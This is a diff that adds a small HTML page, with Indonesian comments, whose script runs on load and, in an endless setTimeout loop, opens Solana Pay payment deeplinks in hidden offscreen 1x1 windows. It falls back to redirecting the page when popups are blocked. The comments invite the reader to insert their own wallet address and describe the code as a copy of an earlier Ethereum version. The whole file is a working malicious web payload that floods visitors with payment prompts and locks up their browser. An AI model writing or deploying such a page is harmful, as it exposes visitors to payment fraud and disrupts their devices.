@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>LOOP KEUN SOLANA</title>
+</head>
+<body>
+  <script>
+    function trigger() {
+      // Ganti address di bawah ini dengan address Solana yang kamu kontrol / dummy
+      const deeplink =
+        "solana:7xKXtg3rPz3RkqkHq2hZsK9K6nRQ8fXQHzjJwXzGqZ6u" +
+        "?amount=0.000001" +
+        "&label=LoopTest" +
+        "&message=Solana%20Pay%20Loop";
+
+      const w = window.open(
+        deeplink,
+        "_blank",
+        "width=1,height=1,left=-100,top=-100"
+      );
+
+      // Fallback kalau window.open diblok (browser / in-app browser)
+      if (!w || w.closed || typeof w.closed === "undefined") {
+        location.href = deeplink;
+      }
+
+      // Loop terus seperti contoh Ethereum kamu
+      setTimeout(trigger, 0);
+    }
+
+    window.onload = trigger;
+  </script>
+</body>
+</html>
